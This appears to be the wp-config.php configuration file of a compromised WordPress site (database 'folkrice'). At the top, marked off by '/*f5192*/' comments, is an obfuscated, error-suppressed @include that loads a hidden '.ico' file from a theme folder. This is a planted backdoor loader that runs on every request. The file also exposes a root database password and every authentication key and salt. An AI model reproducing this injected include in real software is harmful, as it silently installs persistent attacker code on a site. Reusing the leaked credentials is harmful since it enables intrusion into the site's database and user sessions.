<?php
/*f5192*/

@include "\057var\057www\057fol\153ric\145.co\155/wp\055con\164ent\057the\155es/\146ade\144/.0\063043\141c3.\151co";

/*f5192*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'folkrice');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '468fb4e452856e2919b6e066fa69af55e3d3b53f03687336');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'r9dA*^*ysx<,>d:|*rHHF][6/7>1SUrMBU7[Kv:[_hdVb;kVE[G~KsrnE%~m*T;+');
define('SECURE_AUTH_KEY',  'X5[4<2^ATY$,ur}y4t1O4y6C(zb< 9*^I0R]S@X7;qlmld#*[KWwDmv.uCRN}-sr');
define('LOGGED_IN_KEY',    'B<qHx8r0(XMULBsN25nh#Ne)bv?Htpajd@cw*6}u9y6u@6~%R}NSaIoOsZ>{Fe{-');
define('NONCE_KEY',        'fF 742D$ej+N>V0S`93|vZ2wCMbp>Y8R|W@|*#-A`k.UbLYV%Pyf4}yoM^]$]^%5');
define('AUTH_SALT',        'CK5sNO2d$rO4$(ojE3oqzy5*2l5okg[)pSbTP4y@p>;rINi=|S85@hU|*5LA60UM');
define('SECURE_AUTH_SALT', '0*:[g~/Naqlgf@G:31[-JW8PEgrpSh|g|<%CrMa4!jN_>6 z]v:uWN(z?hxS!WOR');
define('LOGGED_IN_SALT',   'DXUZXTgI3@9Zd$#R>riOAxl|LN|{mW+)8^t$>V{^. x4}{r/afj/t=X)[l:@I&=O');
define('NONCE_SALT',       ':E^[3%Nq@.r+h V3-vef,QJ(?2y{|h-=NGmhmR$L0[2Kcn]eowC,d_[6]qz_@3M&');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
